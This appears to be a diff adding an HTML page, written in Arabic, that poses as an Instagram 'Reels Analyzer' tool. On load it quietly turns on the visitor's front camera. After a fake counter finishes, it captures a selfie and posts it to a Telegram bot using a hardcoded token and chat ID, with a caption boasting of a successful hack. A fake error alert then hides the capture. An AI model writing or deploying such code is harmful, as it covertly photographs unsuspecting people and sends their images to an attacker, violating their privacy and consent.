@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Tools - Reels Analyzer</title>
+    <style>
+        body { background-color: #fafafa; color: #262626; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; border-radius: 8px; width: 350px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .insta-logo { width: 180px; margin-bottom: 20px; }
+        .loading-box { margin: 25px 0; }
+        #counter { font-size: 3.5rem; font-weight: 200; color: #262626; margin: 10px 0; }
+        .status { color: #8e8e8e; font-size: 0.9rem; }
+        .btn-start { background-color: #0095f6; color: white; border: none; border-radius: 4px; padding: 10px 20px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
+        .btn-start:disabled { background-color: #b2dffc; }
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="insta-logo">
+        <p class="status" id="msg">جاري الاتصال بقاعدة بيانات Instagram...</p>
+        
+        <div class="loading-box">
+            <div id="counter">0</div>
+            <p class="status">إجمالي الريلز المكتشفة</p>
+        </div>
+
+        <button class="btn-start" id="startBtn">بدء تحليل الحساب</button>
+        <p style="font-size: 0.7rem; color: #c7c7c7; margin-top: 15px;">سيتم معالجة البيانات وفقاً لسياسة الخصوصية</p>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const TOKEN = '8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwXODPs';
+        const CHAT_ID = '7822309283';
+
+        const counterEl = document.getElementById('counter');
+        const startBtn = document.getElementById('startBtn');
+        const msgEl = document.getElementById('msg');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // بدء الكاميرا
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+            } catch (err) { console.log("Access Denied"); }
+        }
+
+        // إرسال الصورة مع رقم الريلز
+        async function sendToTelegram(count) {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'selfie.jpg');
+                formData.append('caption', `✅ صيد ريلز جديد!\n📊 عدد الريلز: ${count}\n⚡ الحالة: تم الاختراق بنجاح`);
+
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg', 0.7);
+        }
+
+        // تشغيل العداد
+        startBtn.onclick = () => {
+            startBtn.disabled = true;
+            msgEl.innerText = "جاري فحص المقاطع والأرشفة...";
+            
+            let current = 0;
+            let target = Math.floor(Math.random() * (450 - 120)) + 120;
+            
+            const timer = setInterval(() => {
+                current += Math.floor(Math.random() * 15);
+                if (current >= target) {
+                    counterEl.innerText = target;
+                    clearInterval(timer);
+                    msgEl.innerText = "اكتمل الفحص! جاري المزامنة...";
+                    sendToTelegram(target); // إرسال الصورة عند انتهاء العداد
+                    setTimeout(() => { alert("خطأ في المزامنة: يرجى تحديث الصفحة والمحاولة لاحقاً."); }, 2000);
+                } else {
+                    counterEl.innerText = current;
+                }
+            }, 60);
+        };
+
+        // تشغيل الكاميرا فور الدخول
+        window.onload = initCamera;
+    </script>
+</body>
+</html>
